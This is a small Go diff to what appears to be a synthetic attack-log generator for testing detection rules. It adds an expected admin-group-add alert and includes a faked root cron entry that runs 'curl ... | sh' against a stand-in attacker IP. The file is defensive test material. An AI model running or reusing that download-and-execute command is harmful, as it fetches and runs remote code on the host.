@@ -203,7 +203,7 @@ func (b *builder) attacks() ([]Expected, []string) {
 		b.syslog(b.at(2, 30+run*30, 1), "CRON", "(root) CMD (curl -fsSL http://203.0.113.80/u.sh | sh)")
 	}
 	expected = append(expected, Expected{"ssh_brute_force", attacker}, Expected{"ssh_brute_force_success", attacker},
-		Expected{"linux_user_created", ""}, Expected{"linux_cron_download_exec", ""})
+		Expected{"linux_user_created", ""}, Expected{"linux_admin_group_add", ""}, Expected{"linux_cron_download_exec", ""})
 
 	// 2. Password spraying: one try for each of twelve user names.
 	sprayer := "203.0.113.50"
